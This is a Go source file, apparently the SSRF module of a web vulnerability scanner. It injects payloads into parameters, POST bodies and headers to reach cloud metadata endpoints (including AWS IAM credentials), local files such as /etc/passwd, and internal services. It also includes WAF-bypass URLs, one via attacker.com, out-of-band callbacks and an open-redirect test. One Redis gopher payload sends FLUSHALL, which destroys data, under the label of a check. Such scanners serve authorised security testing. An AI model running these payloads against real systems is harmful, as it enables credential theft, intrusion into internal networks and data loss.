package main

import (
	"context"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"time"
)

// ─── SSRF Payloads ────────────────────────────────────────────────────────────
var ssrfInternalTargets = []struct {
	URL     string
	Label   string
	Pattern *regexp.Regexp
}{
	{"http://169.254.169.254/latest/meta-data/", "AWS IMDSv1", regexp.MustCompile(`ami-id|instance-id|security-credentials|hostname`)},
	{"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM Creds", regexp.MustCompile(`AccessKeyId|SecretAccessKey|Token`)},
	{"http://metadata.google.internal/computeMetadata/v1/", "GCP Metadata", regexp.MustCompile(`project-id|service-accounts|token`)},
	{"http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure IMDS", regexp.MustCompile(`subscriptionId|resourceGroupName|azEnvironment`)},
	{"http://100.100.100.200/latest/meta-data/", "Alibaba Cloud", regexp.MustCompile(`instance-id|region-id`)},
	{"http://192.168.0.1/", "Internal Gateway", regexp.MustCompile(`(?i)(router|gateway|admin|login|dashboard)`)},
	{"http://127.0.0.1/", "Localhost", regexp.MustCompile(`(?i)(localhost|127\.0\.0\.1|welcome|index)`)},
	{"http://127.0.0.1:8080/", "Localhost:8080", regexp.MustCompile(`(?i)(tomcat|spring|jetty|admin)`)},
	{"http://127.0.0.1:8500/v1/agent/self", "Consul", regexp.MustCompile(`(?i)(consul|datacenter|NodeName)`)},
	{"http://127.0.0.1:9200/", "Elasticsearch", regexp.MustCompile(`(?i)(elasticsearch|cluster_name|version)`)},
	{"http://127.0.0.1:6379/", "Redis", regexp.MustCompile(`(?i)(redis|PONG|\+OK)`)},
	{"http://127.0.0.1:27017/", "MongoDB", regexp.MustCompile(`(?i)(mongodb|mongod|ismaster)`)},
}

var ssrfParamNames = []string{
	"url", "uri", "src", "source", "dest", "destination", "redirect",
	"next", "return", "returnUrl", "return_url", "callback", "callbackUrl",
	"callback_url", "path", "file", "target", "link", "href", "fetch",
	"load", "import", "proxy", "forward", "host", "endpoint", "api",
	"feed", "preview", "remote", "data", "content", "image", "img",
	"avatar", "picture", "photo", "icon", "logo", "document", "pdf",
	"download", "export", "webhook", "notify", "ping",
}

var ssrfSchemes = []string{
	"http://", "https://",
	"file:///etc/passwd",
	"file:///c:/windows/win.ini",
	"dict://127.0.0.1:6379/INFO",
	"gopher://127.0.0.1:6379/_INFO%0D%0A",
	"ftp://127.0.0.1/",
}

var ssrfBypassVariants = []string{
	"http://169.254.169.254/",
	"http://169.254.169.254@attacker.com/",    // @ bypass
	"http://[::ffff:169.254.169.254]/",        // IPv6 mapped
	"http://0xA9FEA9FE/",                      // hex IP
	"http://2852039166/",                      // decimal IP
	"http://169.254.169.254.xip.io/",          // DNS rebind style
	"http://①⑥⑨。②⑤④。①⑥⑨。②⑤④/",                 // Unicode
	"http://127.0.0.1:80%2F@169.254.169.254/", // encoded slash
}

func (s *Scanner) scanSSRF(ctx context.Context, target string) {
	baseline := s.requester.Baseline(ctx, target)
	params := extractParams(target)

	// Also check POST params
	postParams := ssrfParamNames

	// 1. In-band SSRF via URL params
	s.ssrfInband(ctx, target, params, baseline)

	// 2. In-band SSRF via POST body (common param names)
	s.ssrfPOSTInband(ctx, target, postParams, baseline)

	// 3. SSRF via HTTP headers
	s.ssrfHeaders(ctx, target, baseline)

	// 4. Bypass variants (if OOB host set)
	if s.cfg.OOBHost != "" {
		s.ssrfOOB(ctx, target, params)
		s.ssrfOOBHeaders(ctx, target)
	}

	// 5. Scheme injection (file://, gopher://, dict://)
	s.ssrfSchemes(ctx, target, params, baseline)

	// 6. Blind time-based (internal non-routable)
	s.ssrfTimeBased(ctx, target, params)
}

func (s *Scanner) ssrfInband(ctx context.Context, target string, params []string, baseline *RespData) {
	// Use URL params if present, else inject common SSRF param names
	testParams := params
	if len(testParams) == 0 {
		testParams = ssrfParamNames[:10]
	}

	for _, param := range testParams {
		for _, internal := range ssrfInternalTargets {
			payloads := []string{internal.URL}
			if s.cfg.WAFBypass {
				payloads = append(payloads, ssrfBypassVariants...)
			}

			for _, payload := range payloads {
				parsed, err := url.Parse(target)
				if err != nil {
					continue
				}
				q := parsed.Query()
				q.Set(param, payload)
				parsed.RawQuery = q.Encode()

				resp, err := s.requester.Do(ReqOpts{
					Method:  "GET",
					URL:     parsed.String(),
					Context: ctx,
				})
				if err != nil {
					continue
				}

				if s.requester.IsNewContent(baseline, resp, internal.Pattern) {
					snippet := extractSnippet(resp.Body, internal.Pattern)
					s.store.Add(Finding{
						URL:      target,
						Vuln:     "SSRF",
						Type:     fmt.Sprintf("In-band GET (%s)", internal.Label),
						Payload:  fmt.Sprintf("%s=%s", param, payload),
						Evidence: fmt.Sprintf("Internal response content detected: %s", snippet),
						Severity: "CRITICAL",
						Response: snippet,
					})
				}
			}
		}
	}
}

func (s *Scanner) ssrfPOSTInband(ctx context.Context, target string, params []string, baseline *RespData) {
	for _, param := range params[:min(8, len(params))] {
		for _, internal := range ssrfInternalTargets[:4] { // top 4 cloud metadata
			// Form POST
			body := fmt.Sprintf("%s=%s", param, url.QueryEscape(internal.URL))
			resp, err := s.requester.Do(ReqOpts{
				Method:      "POST",
				URL:         target,
				ContentType: "application/x-www-form-urlencoded",
				Body:        body,
				Context:     ctx,
			})
			if err == nil && s.requester.IsNewContent(baseline, resp, internal.Pattern) {
				s.store.Add(Finding{
					URL:      target,
					Vuln:     "SSRF",
					Type:     fmt.Sprintf("In-band POST Form (%s)", internal.Label),
					Payload:  fmt.Sprintf("POST %s=%s", param, internal.URL),
					Evidence: fmt.Sprintf("Cloud metadata pattern matched in POST response"),
					Severity: "CRITICAL",
				})
			}

			// JSON POST
			jsonBody := fmt.Sprintf(`{"%s":"%s"}`, param, internal.URL)
			resp2, err2 := s.requester.Do(ReqOpts{
				Method:      "POST",
				URL:         target,
				ContentType: "application/json",
				Body:        jsonBody,
				Context:     ctx,
			})
			if err2 == nil && s.requester.IsNewContent(baseline, resp2, internal.Pattern) {
				s.store.Add(Finding{
					URL:      target,
					Vuln:     "SSRF",
					Type:     fmt.Sprintf("In-band JSON POST (%s)", internal.Label),
					Payload:  fmt.Sprintf(`JSON: {"%s":"%s"}`, param, internal.URL),
					Evidence: "Cloud metadata pattern matched in JSON POST response",
					Severity: "CRITICAL",
				})
			}
		}
	}
}

func (s *Scanner) ssrfHeaders(ctx context.Context, target string, baseline *RespData) {
	ssrfHeaderNames := []string{
		"X-Forwarded-For", "X-Forwarded-Host", "X-Real-IP",
		"X-Original-URL", "X-Rewrite-URL", "X-Custom-IP-Authorization",
		"X-Host", "Forwarded", "True-Client-IP",
		"CF-Connecting-IP", "X-ProxyUser-Ip",
	}

	for _, header := range ssrfHeaderNames {
		for _, internal := range ssrfInternalTargets[:3] {
			resp, err := s.requester.Do(ReqOpts{
				Method:  "GET",
				URL:     target,
				Headers: map[string]string{header: internal.URL},
				Context: ctx,
			})
			if err != nil {
				continue
			}
			if s.requester.IsNewContent(baseline, resp, internal.Pattern) {
				s.store.Add(Finding{
					URL:      target,
					Vuln:     "SSRF",
					Type:     fmt.Sprintf("Header Injection (%s)", header),
					Payload:  fmt.Sprintf("%s: %s", header, internal.URL),
					Evidence: fmt.Sprintf("Internal content in response via header: %s", header),
					Severity: "HIGH",
				})
			}
		}
	}
}

func (s *Scanner) ssrfOOB(ctx context.Context, target string, params []string) {
	testParams := params
	if len(testParams) == 0 {
		testParams = ssrfParamNames[:10]
	}

	oobID := randomID("ssrf")

	for _, param := range testParams[:min(5, len(testParams))] {
		oobURL := fmt.Sprintf("http://%s/oob/%s", s.cfg.OOBHost, oobID)
		parsed, err := url.Parse(target)
		if err != nil {
			continue
		}
		q := parsed.Query()
		q.Set(param, oobURL)
		parsed.RawQuery = q.Encode()

		s.requester.Do(ReqOpts{Method: "GET", URL: parsed.String(), Context: ctx})

		// Also POST
		body := fmt.Sprintf("%s=%s", param, url.QueryEscape(oobURL))
		s.requester.Do(ReqOpts{
			Method: "POST", URL: target,
			ContentType: "application/x-www-form-urlencoded",
			Body:        body, Context: ctx,
		})
	}

	if hit, info := s.oob.Check(oobID, 5*time.Second); hit {
		s.store.Add(Finding{
			URL:      target,
			Vuln:     "SSRF",
			Type:     "Out-of-Band (Blind SSRF)",
			Payload:  fmt.Sprintf("param=http://%s/oob/%s", s.cfg.OOBHost, oobID),
			Evidence: fmt.Sprintf("OOB HTTP callback from %s at %s", info.RemoteAddr, info.Time.Format(time.RFC3339)),
			Severity: "HIGH",
		})
	}
}

func (s *Scanner) ssrfOOBHeaders(ctx context.Context, target string) {
	oobID := randomID("ssrf-hdr")
	oobURL := fmt.Sprintf("http://%s/oob/%s", s.cfg.OOBHost, oobID)

	ssrfHeaders := []string{
		"X-Forwarded-For", "Referer", "Origin",
		"X-Real-IP", "X-Forwarded-Host",
	}
	for _, h := range ssrfHeaders {
		s.requester.Do(ReqOpts{
			Method:  "GET",
			URL:     target,
			Headers: map[string]string{h: oobURL},
			Context: ctx,
		})
	}

	if hit, info := s.oob.Check(oobID, 4*time.Second); hit {
		s.store.Add(Finding{
			URL:      target,
			Vuln:     "SSRF",
			Type:     "OOB via HTTP Header",
			Payload:  fmt.Sprintf("Header: %s", oobURL),
			Evidence: fmt.Sprintf("Server fetched OOB URL from header — callback: %s", info.RemoteAddr),
			Severity: "HIGH",
		})
	}
}

func (s *Scanner) ssrfSchemes(ctx context.Context, target string, params []string, baseline *RespData) {
	testParams := params
	if len(testParams) == 0 {
		testParams = []string{"url", "src", "file", "path", "load"}
	}

	schemePayloads := []struct {
		Scheme  string
		Pattern *regexp.Regexp
		Label   string
	}{
		{"file:///etc/passwd", regexp.MustCompile(`root:.*:0:0:`), "LFI via file://"},
		{"file:///c:/windows/win.ini", regexp.MustCompile(`\[fonts\]`), "LFI via file:// (Windows)"},
		{"dict://127.0.0.1:6379/INFO", regexp.MustCompile(`(?i)(redis_version|connected_clients)`), "Redis via dict://"},
		{"gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a", regexp.MustCompile(`(?i)(\+OK|redis)`), "Redis via gopher://"},
	}

	for _, param := range testParams[:min(5, len(testParams))] {
		for _, sp := range schemePayloads {
			parsed, err := url.Parse(target)
			if err != nil {
				continue
			}
			q := parsed.Query()
			q.Set(param, sp.Scheme)
			parsed.RawQuery = q.Encode()

			resp, err := s.requester.Do(ReqOpts{
				Method:  "GET",
				URL:     parsed.String(),
				Context: ctx,
			})
			if err != nil {
				continue
			}
			if s.requester.IsNewContent(baseline, resp, sp.Pattern) {
				s.store.Add(Finding{
					URL:      target,
					Vuln:     "SSRF",
					Type:     sp.Label,
					Payload:  fmt.Sprintf("%s=%s", param, sp.Scheme),
					Evidence: fmt.Sprintf("Scheme %s accepted and response matches pattern", sp.Scheme[:10]),
					Severity: "CRITICAL",
					Response: extractSnippet(resp.Body, sp.Pattern),
				})
			}
		}
	}
}

func (s *Scanner) ssrfTimeBased(ctx context.Context, target string, params []string) {
	testParams := params
	if len(testParams) == 0 {
		testParams = []string{"url", "src", "dest", "redirect", "fetch"}
	}

	// Non-routable IPs with different ports to detect connection attempts
	blindTargets := []string{
		"http://10.255.255.1/",
		"http://172.31.255.254/",
		"http://192.168.255.254:8080/",
	}

	for _, param := range testParams[:min(3, len(testParams))] {
		for _, bt := range blindTargets {
			parsed, err := url.Parse(target)
			if err != nil {
				continue
			}
			q := parsed.Query()
			q.Set(param, bt)
			parsed.RawQuery = q.Encode()

			start := nowMs()
			s.requester.Do(ReqOpts{Method: "GET", URL: parsed.String(), Context: ctx})
			elapsed := nowMs() - start

			if elapsed > 7000 {
				s.store.Add(Finding{
					URL:      target,
					Vuln:     "SSRF",
					Type:     "Blind Time-based",
					Payload:  fmt.Sprintf("%s=%s", param, bt),
					Evidence: fmt.Sprintf("Connection to %s caused %dms delay (internal network reachable)", bt, elapsed),
					Severity: "MEDIUM",
				})
				break
			}
		}
	}
}

// ─── Open Redirect (bonus — detected during SSRF scan) ───────────────────────
var openRedirectPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)location:\s*https?://`),
}

func (s *Scanner) checkOpenRedirect(ctx context.Context, target string, param string) {
	redirectPayload := "https://evil.example.com"
	parsed, err := url.Parse(target)
	if err != nil {
		return
	}
	q := parsed.Query()
	q.Set(param, redirectPayload)
	parsed.RawQuery = q.Encode()

	resp, err := s.requester.Do(ReqOpts{Method: "GET", URL: parsed.String(), Context: ctx})
	if err != nil {
		return
	}

	location := resp.Headers.Get("Location")
	if (resp.StatusCode == 301 || resp.StatusCode == 302 || resp.StatusCode == 307) &&
		strings.Contains(location, "evil.example.com") {
		s.store.Add(Finding{
			URL:      target,
			Vuln:     "Open Redirect",
			Type:     "Header-based Redirect",
			Payload:  fmt.Sprintf("%s=%s", param, redirectPayload),
			Evidence: fmt.Sprintf("Location header: %s (status %d)", location, resp.StatusCode),
			Severity: "MEDIUM",
		})
	}
}
